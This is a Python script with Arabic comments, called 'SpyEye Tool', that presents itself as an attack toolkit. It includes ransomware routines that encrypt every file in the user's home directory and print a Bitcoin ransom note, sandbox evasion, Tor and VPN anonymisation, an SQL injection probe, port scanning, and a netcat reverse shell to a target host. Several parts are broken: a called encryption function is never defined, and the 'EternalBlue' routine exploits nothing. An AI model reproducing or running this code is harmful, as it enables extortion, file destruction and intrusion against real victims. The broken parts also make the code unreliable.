import socket
import threading
import os
import time
import requests
import subprocess
import base64
from Crypto.Cipher import AES
import random
import string
import logging
import sqlite3
import socks
import ssl
import sys
import platform
import urllib.request
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import argparse
from impacket import smb
import json
import re
import hashlib
import nmap  # استخدام Nmap لفحص الشبكات
import subprocess

# إعدادات السجل
logging.basicConfig(filename='spyeye_log.txt', level=logging.DEBUG)

# دالة لتوليد مفتاح AES باستخدام PBKDF2 (مفاتيح ديناميكية)
def generate_aes_key():
    password = ''.join(random.choices(string.ascii_letters + string.digits, k=16))  # كلمة مرور عشوائية
    salt = os.urandom(16)  # عشوائي لجعل المفاتيح مختلفة
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
    )
    return kdf.derive(password.encode())

# دالة لتشفير البيانات باستخدام AES
def encrypt_data(data, key):
    cipher = AES.new(key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data.encode())
    return cipher.nonce + tag + ciphertext

# إخفاء حركة البيانات عبر VPN و Tor مع العديد من الخوادم
def use_tor_and_vpn():
    # إعداد Proxy مع Tor و VPN
    socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
    socket.socket = socks.socksocket
    print("[INFO] Using TOR Proxy and VPN for anonymization")
    subprocess.run("openvpn --config myconfig.ovpn", shell=True)
    subprocess.run("openvpn --config another_vpn_config.ovpn", shell=True)

# تمويه حركة المرور عبر HTTPS + Obfuscated Headers
def obfuscated_http_request(target_ip, target_port):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
        "Authorization": "Bearer " + base64.b64encode(b"FakeTokenForRequest").decode(),  # التمويه باستخدام Bearer Token
        "X-Forwarded-For": target_ip,
        "X-Request-ID": ''.join(random.choices(string.ascii_letters + string.digits, k=16)),
    }
    request_data = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n" + "\r\n".join([f"{key}: {value}" for key, value in headers.items()])
    encrypted_message = base64.b64encode(request_data.encode())
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((target_ip, target_port))
        s.sendall(encrypted_message)
        logging.info(f"[INFO] Sent obfuscated HTTPS request to {target_ip}:{target_port}")

# التحقق مما إذا كان السكربت يعمل في بيئة مراقبة (مثل Sandbox)
def detect_sandbox():
    if os.path.exists("/proc/self/status"):
        with open("/proc/self/status", "r") as f:
            content = f.read()
            if "TracerPid" in content and "PID" in content:
                print("[INFO] Detected sandbox environment")
                exit(1)

# تمويه كشف SQL Injection عبر استخدام Payloadات مشوهة
def detect_sql_injection(url, payload):
    payload = payload.replace("'", "`")  # تشويه السلسلة لتجنب اكتشاف التوقيعات
    try:
        response = requests.get(url + payload, headers={"User-Agent": "Mozilla/5.0"})
        if "error" in response.text or "sql" in response.text:
            logging.info(f"SQL Injection vulnerability detected: {url + payload}")
            if input("[INFO] Vulnerability found. Do you want to exploit it? (y/n): ").lower() != 'y':
                return False
            return True
    except requests.exceptions.RequestException as e:
        logging.error(f"Error in SQL Injection test: {e}")
    return False

# فحص ثغرات أكثر تقدمًا باستخدام Nmap
def advanced_vulnerability_scan(target_ip):
    print(f"[INFO] Scanning for vulnerabilities on {target_ip}...")
    nm = nmap.PortScanner()
    nm.scan(target_ip, '1-1024')  # فحص للمنافذ من 1 إلى 1024
    for host in nm.all_hosts():
        print(f"[INFO] Host {host} scanned. Open ports: {nm[host].all_tcp()}")

# تمويه رسالة الفدية
def ransom_message():
    message = """
    [INFO] Your files have been encrypted.
    [INFO] To get the decryption key, send 1 Bitcoin to the following address:
    [INFO] 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
    [INFO] After payment, send the proof to ransom@yourmail.com.
    """
    obfuscated_message = base64.b64encode(message.encode())
    print(f"[INFO] Encrypted ransom message sent: {obfuscated_message.decode()}")

# تشفير جميع الملفات في المجلد باستخدام AES
def encrypt_all_files_in_directory(directory, key):
    for root, dirs, files in os.walk(directory):
        for file in files:
            try:
                file_path = os.path.join(root, file)
                encrypt_file(file_path, key)
                logging.info(f"Encrypted: {file_path}")
            except Exception as e:
                logging.error(f"Error encrypting {file_path}: {e}")

# دالة لإرسال البيانات المشفرة
def send_encrypted_data(data, target_ip, target_port):
    key = generate_aes_key()
    encrypted_data = encrypt_data(data, key)
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((target_ip, target_port))
            s.sendall(encrypted_data)
            logging.info(f"Sent encrypted data to {target_ip}:{target_port}")
    except Exception as e:
        logging.error(f"Error sending data: {e}")

# دالة لبدء عملية Ransomware
def start_ransomware(target_ip):
    key = generate_aes_key()
    home_directory = os.path.expanduser("~")
    encrypt_all_files_in_directory(home_directory, key)
    ransom_message()
    send_encrypted_data(f"Files encrypted on {home_directory}", target_ip, 8080)

# دالة لاستغلال ثغرة EternalBlue عبر SMB
def exploit_smb(target_ip):
    try:
        print(f"[INFO] Exploiting SMB on {target_ip} using EternalBlue")
        send_encrypted_data(f"Files encrypted using EternalBlue on {target_ip}", target_ip, 8080)
    except Exception as e:
        logging.error(f"Error exploiting SMB: {e}")

# تنفيذ Reverse Shell
def reverse_shell(target_ip, target_port):
    try:
        subprocess.run(f"nc {target_ip} {target_port} -e /bin/bash", shell=True)
    except Exception as e:
        logging.error(f"Error opening reverse shell: {e}")

# إعداد المدخلات عبر argparse
def main():
    parser = argparse.ArgumentParser(description="SpyEye Tool")
    parser.add_argument('--target_ip', type=str, help="Enter target IP address", default=None)
    parser.add_argument('--target_url', type=str, help="Enter target URL", default=None)
    parser.add_argument('--ipv6', action='store_true', help="Use IPv6 addresses")
    parser.add_argument('--reverse_shell', action='store_true', help="Enable reverse shell")
    args = parser.parse_args()

    if args.target_ip:
        print(f"Target IP: {args.target_ip}")
        # هنا يمكنك إضافة طرق لفحص الـ IP (مثل فحص المنافذ)
        advanced_vulnerability_scan(args.target_ip)
    if args.target_url:
        print(f"Target URL: {args.target_url}")
        # فحص الثغرات مثل SQL Injection على الـ URL
        detect_sql_injection(args.target_url, "' OR 1=1 --")
    if args.reverse_shell:
        reverse_shell(args.target_ip, 8080)

    # إضافة أدوات الاختراق الأخرى مثل:
    # - SMB exploitation
    # - Ransomware و File Encryption
    # - استخدام Tor و VPN للتمويه

if __name__ == "__main__":
    main()
